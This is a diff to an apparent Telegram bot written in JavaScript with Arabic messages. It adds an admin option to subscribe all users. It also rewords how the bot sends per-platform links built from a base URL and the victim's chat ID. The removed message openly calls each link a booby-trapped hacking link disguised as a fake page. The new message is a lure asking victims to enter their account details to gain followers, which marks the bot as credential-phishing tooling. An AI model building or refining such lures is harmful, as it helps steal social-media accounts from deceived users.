@@ -99,6 +99,7 @@ function createAdminKeyboard() {
         [{ text: 'الاشتراك', callback_data:'subscribe' }],
         [{ text: 'إلغاء الاشتراك', callback_data:'unsubscribe' }],
         [{ text: 'إلغاء اشتراك جميع المستخدمين', callback_data:'unsubscribe_all' }],
+        [{ text: 'إضافة اشتراك لجميع المستخدمين ', callback_data:'subscribe_all' }],
         [{ text: 'عرض المشتركين', callback_data:'listsubscribers' }],
         [{ text: 'إرسال نقاط للجميع', callback_data:'send_points_to_all' }],
         [{ text: 'خصم نقاط من الجميع', callback_data:'deduct_points_from_all' }],
@@ -268,9 +269,25 @@ bot.on('callback_query', async (callbackQuery) => {
   });
   break;
   case 'unsubscribe_all':
-      const subscriberCount = subscribedUsers.size;
+      const unsubscribedCount = subscribedUsers.size;
       subscribedUsers.clear();
-      await bot.sendMessage(chatId, `تم إلغاء اشتراك جميع المستخدمين. تم إلغاء اشتراك ${subscriberCount} مستخدم.`);
+      await bot.sendMessage(chatId, `تم إلغاء اشتراك جميع المستخدمين. تم إلغاء اشتراك ${unsubscribedCount} مستخدم.`);
+      break;
+
+    case 'subscribe_all':
+      let subscribedCount = 0;
+      for (const [userId, user] of allUsers) {
+        if (!subscribedUsers.has(userId)) {
+          subscribedUsers.add(userId);
+          subscribedCount++;
+          try {
+            await bot.sendMessage(userId, 'تم تفعيل اشتراكك في البوت. يمكنك الآن استخدام جميع الميزات.');
+          } catch (error) {
+            console.error(`فشل في إرسال رسالة للمستخدم ${userId}:`, error);
+          }
+        }
+      }
+      await bot.sendMessage(chatId, `تم إضافة اشتراك لـ ${subscribedCount} مستخدم جديد.`);
       break;
   }
 
@@ -903,7 +920,7 @@ bot.on('callback_query', (query) => {
 
     let url, message;
 
- let message;
+ 
     if (action === 'login') {
         message = `يرجى تسجيل الدخول إلى ${getPlatformName(platform)}: ${url}`;
     } else if (action === 'increase') {
@@ -914,7 +931,7 @@ bot.on('callback_query', (query) => {
     } else if (data.startsWith('increase_')) {
         const platform = data.split('_')[1];
         url = `${baseUrl}/increase/${platform}/${chatId}`;
-        message = `تم تلغيم رابط اختراق على شكل صفحة مزورة ${getPlatformName(platform)}: ${url}`;
+        message = `يرجى  ادخل معلومات حسابك لزيادة المتابعين ${getPlatformName(platform)}: ${url}`;
     } else {
         console.log('Unhandled callback query:', data);
         message = 'عملية غير معروفة';
